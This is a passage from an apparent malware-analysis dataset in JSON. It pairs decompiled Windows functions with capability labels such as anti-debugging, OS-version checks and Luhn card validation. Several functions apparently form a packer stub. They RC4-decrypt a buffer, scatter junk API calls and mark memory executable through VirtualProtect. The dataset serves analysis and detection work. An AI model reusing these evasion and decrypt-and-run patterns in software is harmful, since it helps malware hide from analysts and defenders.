(&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040b079;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040b079:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040b28d:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3668
    },
    "0040b2d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b2d0(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040b7d1;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x413e20 - 1;\n        iVar4 = *0x413e20 + (*0x413e20 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x413e20 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040b405;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040b40c;\ncode_r0x0040b405:\n                        do {\n                            var_4h = 1;\ncode_r0x0040b40c:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040b41a;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040b41a:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x413e1c - *0x413e20) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x413e1c < iVar12) {\n                if (iVar12 < *0x413e18) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x413e2c;\n                    iVar4 = *0x413e24 + (*0x413e24 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x413e24 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x413e24 + (*0x413e24 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x413e24 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x413e2c + *0x413e18;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040b7d1;\n            }\n            var_10h = *0x413e1c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x413e20 - 1;\n            iVar12 = *0x413e20 + (*0x413e20 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x413e20 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040b5bd;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040b5bd:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x413e24 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040b7d1:\n    var_20h = iVar12 << (0x1fU - *0x413e24 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x413e28 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x413e28 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3657
    },
    "0040e7e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0040e7e0(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar4 = 0x13fc;\n    cVar2 = *0x414170;\n    if (*0x49b724 == 0xda1) {\n        (*_sym.imp.KERNEL32.dll_DebugActiveProcess)(0);\n        (*_sym.imp.KERNEL32.dll_LoadResource)(0, 0);\n        cVar2 = *0x414170;\n    }\n    for (; (cVar2 != '\\0' && (iVar4 != 0)); iVar4 = iVar4 + -1) {\n        pcVar1 = iVar3 + 0x414171;\n        *0x49321c = 0;\n        iVar3 = iVar3 + 1;\n        cVar2 = *pcVar1;\n    }\n    return iVar3;\n}\n",
        "token_count": 214
    },
    "0040cfb0": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\nvoid fcn.0040cfb0(void)\n\n{\n    uchar auStack632 [4];\n    uint uStack628;\n    uint uStack624;\n    uint uStack620;\n    uint uStack616;\n    uint uStack612;\n    uint uStack608;\n    uint uStack604;\n    uint uStack600;\n    uint uStack596;\n    uint uStack592;\n    uint uStack588;\n    uint uStack584;\n    uint uStack580;\n    uint uStack576;\n    uint uStack572;\n    uint uStack568;\n    uint uStack564;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    uint uStack544;\n    uint uStack540;\n    uint uStack536;\n    uint uStack532;\n    uint uStack528;\n    uint uStack524;\n    uint uStack520;\n    uint uStack516;\n    uint uStack512;\n    uint uStack508;\n    uint uStack504;\n    uint uStack500;\n    uint uStack496;\n    uint uStack492;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uint uStack472;\n    uint uStack468;\n    uint uStack464;\n    uint uStack460;\n    uint uStack456;\n    uint uStack452;\n    uint uStack448;\n    uint uStack444;\n    uint uStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uint uStack424;\n    uint uStack420;\n    uint uStack416;\n    uint uStack412;\n    uint uStack408;\n    uint uStack404;\n    uint uStack400;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack584 = 0x4f95f3aa;\n    uStack280 = 0x45185d33;\n    uStack8 = 0x141382cb;\n    uStack524 = 0x2ad946b8;\n    uStack184 = 0x23f15e2;\n    uStack264 = 0x422f027f;\n    uStack144 = 0x6e632a4b;\n    uStack304 = 0x25f2e791;\n    uStack52 = 0x7cd2235;\n    uStack112 = 0x367a55ab;\n    uStack316 = 0x7ec75b6;\n    uStack124 = 0x221c178a;\n    uStack324 = 0x31ffec4d;\n    uStack260 = 0x4621c514;\n    uStack412 = 0x1fe644db;\n    uStack332 = 0x58c16e36;\n    uStack540 = 0x2ec96776;\n    uStack188 = 0x27edeb2b;\n    uStack480 = 0x3bf369b6;\n    uStack196 = 0x6eabe171;\n    uStack68 = 0x6b5645df;\n    uStack368 = 0x4bc9b420;\n    uStack400 = 0x8dafeba;\n    uStack84 = 0x6c8c3a1a;\n    uStack96 = 0x66a88e33;\n    uStack224 = 0x4388bad4;\n    uStack288 = 0x1d29ab7e;\n    uStack376 = 0x63228910;\n    uStack92 = 0x752e49c1;\n    uStack564 = 0x3a7819b4;\n    uStack348 = 0x409750cc;\n    uStack384 = 0x79edcf73;\n    uStack448 = 0x613848d8;\n    uStack576 = 0x1b21740d;\n    uStack336 = 0x1eeaf884;\n    uStack40 = 0x363cb6da;\n    uStack32 = 0x3c54384b;\n    uStack420 = 0x4dee60bb;\n    uStack488 = 0x761bc3d;\n    uStack132 = 0x39fba59e;\n    uStack212 = 0x70da817d;\n    uStack248 = 0xf36b373;\n    uStack140 = 0x24050d0;\n    uStack276 = 0x697e5bb5;\n    uStack104 = 0x6540d759;\n    uStack580 = 0x74252e01;\n    uStack588 = 0x1d5964cd;\n    uStack80 = 0x52cb5639;\n    uStack616 = 0x2e2413b4;\n    uStack312 = 0x2663c9a6;\n    uStack88 = 0x70f77313;\n    uStack456 = 0x17bd777;\n    uStack536 = 0x6ce9d9a2;\n    uStack232 = 0x523917fa;\n    uStack160 = 0x1fab6977;\n    uStack284 = 0x5f97d1c4;\n    uStack344 = 0x81eb896;\n    uStack176 = 0x1a1d9a2a;\n    uStack292 = 0x2339325a;\n    uStack148 = 0x5f4a50bf;\n    uStack356 = 0x576d6884;\n    uStack436 = 0x2e98fc7b;\n    uStack100 = 0x21bf3db9;\n    uStack408 = 0x71b9ac66;\n    uStack156 = 0xd807848;\n    uStack16 = 0x6abbcb4f;\n    uStack208 = 0x5292ad81;\n    uStack464 = 0x108f595d;\n    uStack596 = 0x495bd43e;\n    uStack28 = 0x5dd75e38;\n    uStack164 = 0x56458f12;\n    uStack612 = 0xa2841cdc;\n    uStack200 = 0x854d295d;\n    uStack460 = 0xdaf868ce;\n    uStack604 = 0xdbbbdf44;\n    uStack244 = 0xc447754d;\n    uStack380 = 0xc95a7774;\n    uStack492 = 0xa4af61c3;\n    uStack516 = 0x22e28c46;\n    uStack592 = 0xbea91219;\n    uStack476 = 0xfe6eae25;\n    uStack444 = 0xe2f0fa40;\n    uStack416 = 0x30bb2876;\n    uStack624 = 0x21ed606b;\n    uStack404 = 0x5d3c3ccd;\n    uStack432 = 0x4483a3e5;\n    uStack364 = 0xd4a2f12f;\n    uStack320 = 0xe14e5438;\n    uStack220 = 0xb70f8cb5;\n    uStack24 = 0x68c817c3;\n    uStack568 = 0x90281c4e;\n    uStack392 = 0x235fb910;\n    uStack472 = 0x5a5d16b1;\n    uStack520 = 0xff0ae483;\n    uStack56 = 0x287fe15a;\n    uStack240 = 0x33434682;\n    uStack172 = 0xa828142b;\n    uStack4 = 0x40250790;\n    uStack340 = 0xb4848a38;\n    uStack296 = 0xc4ac2007;\n    uStack300 = 0xa6fe89f8;\n    uStack268 = 0x9a09e730;\n    uStack548 = 0xd2681a83;\n    uStack12 = 0x1686a2dd;\n    uStack452 = 0x7f87e23f;\n    uStack64 = 0x138f3e8c;\n    uStack36 = 0x7909a062;\n    uStack60 = 0xa63187a8;\n    uStack152 = 0x7a0e809b;\n    uStack484 = 0x131bc982;\n    uStack272 = 0xe1f85092;\n    uStack48 = 0xda719fdb;\n    uStack628 = 0x68b7550;\n    uStack328 = 0x6cf51263;\n    uStack608 = 0xb35a7be8;\n    uStack560 = 0x17dabe49;\n    uStack72 = 0x583c8da3;\n    uStack116 = 0x8cb55586;\n    uStack204 = 0x67bc5fb5;\n    uStack468 = 0xe59e2bb1;\n    uStack252 = 0x27323efe;\n    uStack508 = 0xc11294b7;\n    uStack512 = 0x3e12ab6d;\n    uStack256 = 0x71d85c86;\n    uStack20 = 0xe5390f6;\n    uStack120 = 0x5764b147;\n    uStack552 = 0x9a689414;\n    uStack44 = 0xcc43546e;\n    uStack600 = 0x11a1b868;\n    uStack236 = 0xff488205;\n    uStack192 = 0x9413f7a1;\n    uStack180 = 0xfb58be28;\n    uStack544 = 0xa35c92e1;\n    uStack76 = 0xfdf6a964;\n    uStack556 = 0x335fc4ab;\n    uStack136 = 0x4688d958;\n    uStack168 = 0x79071e34;\n    uStack428 = 0xe3e21bbe;\n    uStack496 = 0xcd79564;\n    uStack128 = 0x5d00b791;\n    uStack532 = 0x9a39aa3e;\n    uStack352 = 0x26b9d81e;\n    uStack440 = 0x18867ee;\n    uStack228 = 0xb33bb4fc;\n    uStack372 = 0xdac068;\n    uStack396 = 0xd50c7687;\n    uStack504 = 0x8bbcd980;\n    uStack360 = 0x6a8065f3;\n    uStack108 = 0x8730e8e0;\n    uStack620 = 0xb40a5bc8;\n    uStack216 = 0x47f6c693;\n    uStack308 = 0x9416fb20;\n    uStack388 = 0x8d87c660;\n    uStack528 = 0xdceed8a7;\n    uStack572 = 0x36d8014c;\n    uStack424 = 0x8f3e0dac;\n    uStack500 = 0x6efc3683;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*0x493218, *0x49b724, 0x40, auStack632);\n    return;\n}\n",
        "token_count": 3113
    },
    "0040e890": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0040e890(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    uint in_stack_fffffab8;\n    uchar auStack1032 [1028];\n    uint32_t uStack4;\n    \n    uStack4 = *0x4130a0 ^ &stack0xfffffab8;\n    iVar4 = 0;\n    do {\n        *(iVar4 + 0x493220) = iVar4;\n        pcVar3 = _sym.imp.KERNEL32.dll_CreateFileA;\n        pcVar2 = _sym.imp.KERNEL32.dll_GetPrivateProfileSectionA;\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0x100);\n    *0x497d10 = 0;\n    *0x497d14 = 0;\n    do {\n        uVar5 = *0x497d14 % param_1;\n        if (*0x49b724 == 0x9bc) {\n            (*_sym.imp.KERNEL32.dll_OpenFileMappingW)(0, 0, 0);\n        }\n        uVar1 = *(*0x497d14 + 0x493220);\n        *0x497d10 = uVar1 + *(uVar5 + 0x414170) + *0x497d10 & 0xff;\n        if (*0x49b724 == 0x88a) {\n            (*pcVar2)(0, auStack1032, 0, 0);\n            (*pcVar3)(0, 0, 0, 0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        }\n        uVar5 = *0x497d14;\n        bVar6 = *0x49b724 == 0x298;\n        *(*0x497d14 + 0x493220) = *(*0x497d10 + 0x493220);\n        if (bVar6) {\n            (*_sym.imp.KERNEL32.dll_GlobalLock)(0);\n            (*_sym.imp.KERNEL32.dll_GetUserDefaultLCID)();\n            (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(0);\n            uVar5 = *0x497d14;\n        }\n        *0x497d14 = uVar5 + 1;\n        *(*0x497d10 + 0x493220) = uVar1;\n    } while (*0x497d14 != 0x100);\n    if (*0x49b724 == 0x523) {\n        (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(0, 0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(0, 0);\n    }\n    *0x497d14 = 0;\n    if (*0x49b724 == 0x9be) {\n        (*_sym.imp.KERNEL32.dll_FindFirstFileA)(0, &stack0xfffffab8);\n    }\n    *0x497d10 = 0;\n    fcn.00401799(in_stack_fffffab8);\n    return;\n}\n",
        "token_count": 718
    },
    "0040ea20": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0040ea20(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar5 = *0x49b724;\n    iVar2 = *0x493218;\n    uVar3 = fcn.0040e7e0();\n    if (*0x49b724 == 0x488) {\n        (*_sym.imp.KERNEL32.dll_HeapReAlloc)(0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_BackupWrite)(0, 0, 0, 0, 0, 0, 0);\n    }\n    fcn.0040e890(uVar3);\n    if (*0x49b724 == 0xac1) {\n        (*_sym.imp.KERNEL32.dll_UnregisterWait)(0);\n        (*_sym.imp.KERNEL32.dll_FlushViewOfFile)(0, 0);\n    }\n    iVar5 = iVar5 + -1;\n    if (*0x49b724 == 0x638) {\n        (*_sym.imp.KERNEL32.dll_SetProcessShutdownParameters)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetComputerNameW)(0);\n    }\n    for (; -1 < iVar5; iVar5 = iVar5 + -1) {\n        uVar4 = *0x497d14 + 1 & 0xff;\n        *0x497d10 = *(uVar4 + 0x493220) + *0x497d10 & 0xff;\n        uVar1 = *(*0x497d10 + 0x493220);\n        *0x497d14 = uVar4;\n        *(*0x497d10 + 0x493220) = *(uVar4 + 0x493220);\n        *(uVar4 + 0x493220) = uVar1;\n        *(iVar2 + iVar5) = *(iVar2 + iVar5) ^ *((*(*0x497d10 + 0x493220) + uVar1 & 0xff) + 0x493220);\n    }\n    return;\n}\n",
        "token_count": 481
    },
    "004010b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004010b0(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t *arg_8h;\n    int32_t *piVar1;\n    uint32_t arg_14h;\n    \n    if (*(param_2 + 0x14) < param_3) {\n        fcn.004016c2();\n    }\n    arg_14h = *(param_2 + 0x14) - param_3;\n    if (param_4 < arg_14h) {\n        arg_14h = param_4;\n    }\n    if (param_1 != param_2) {\n        if (arg_14h == 0xffffffff) {\n            fcn.0040168a();\n        }\n        if (*(param_1 + 0x18) < arg_14h) {\n            fcn.00401370(arg_14h, *(param_1 + 0x14));\n        }\n        else if (arg_14h == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (arg_14h != 0) {\n            if (*(param_2 + 0x18) < 0x10) {\n                param_2 = param_2 + 4;\n            }\n            